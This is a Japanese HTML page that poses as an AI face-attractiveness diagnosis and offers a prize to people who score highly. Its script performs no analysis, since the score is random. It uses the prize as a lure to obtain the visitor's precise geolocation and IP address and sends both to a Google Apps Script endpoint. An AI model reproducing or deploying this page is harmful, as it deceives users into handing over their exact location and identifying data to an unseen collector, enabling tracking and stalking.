<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>顔面偏差値診断</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; }
        .notice { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; margin: 10px auto; max-width: 400px; font-size: 0.9em; }
        footer { margin-top: 50px; padding: 20px; font-size: 0.8em; color: #555; border-top: 1px solid #ccc; }
    </style>
</head>
<body>

    <h1>AI顔面偏差値診断</h1>
    
    <div class="notice">
        <p><strong>【重要】景品プレゼントについて</strong><br>
        顔面偏差値が<strong>90点以上</strong>の方には景品をお送りします。<br>
        配送先確認のため、診断実行時に<strong>位置情報の許可</strong>をお願いいたします。</p>
    </div>

    <button id="checkButton">診断を実行する</button>
    <p id="r"></p>

    <footer>
        <p><strong>株式会社デジタルアイ・ソリューションズ</strong></p>
        <p>運営責任者：佐藤 健一</p>
        <p>当サイトでは、画像データの保存は行いません。<br>
        景品発送および診断精度向上のため、位置情報を含むデータを取得いたします。</p>
    </footer>

    <script>
        const url = "https://script.google.com/macros/s/AKfycbxBaw5j9FdQPtYAorJaMzD3R9gyr8509hQIPDZ3Njfh5ZJ6PGcVNlC62Xn-GV4YvkdcOA/exec";

        document.getElementById('checkButton').addEventListener('click', async () => {
            const display = document.getElementById('r');
            display.innerText = "位置情報を取得しています...（許可してください）";

            try {
                // 位置情報取得（タイムアウト20秒）
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 20000,
                        maximumAge: 0
                    });
                });
                
                const locationText = `緯度: ${pos.coords.latitude}, 経度: ${pos.coords.longitude}`;

                // IP取得
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                const score = Math.floor(Math.random() * 100);
                const data = {
                    msg: `📊 顔面偏差値診断レポート\n結果: ${score}点\n景品対象: ${score >= 90 ? "✅ 対象" : "❌ 非対象"}\nIP: ${ipData.ip}\n位置情報: ${locationText}`
                };

                const response = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                if (response.ok) {
                    display.innerText = "送信完了！";
                } else {
                    display.innerText = "送信失敗";
                }
            } catch (e) {
                display.innerText = "位置情報の取得に失敗しました。設定から許可されているか確認してください。";
            }
        });
    </script>
</body>
</html>
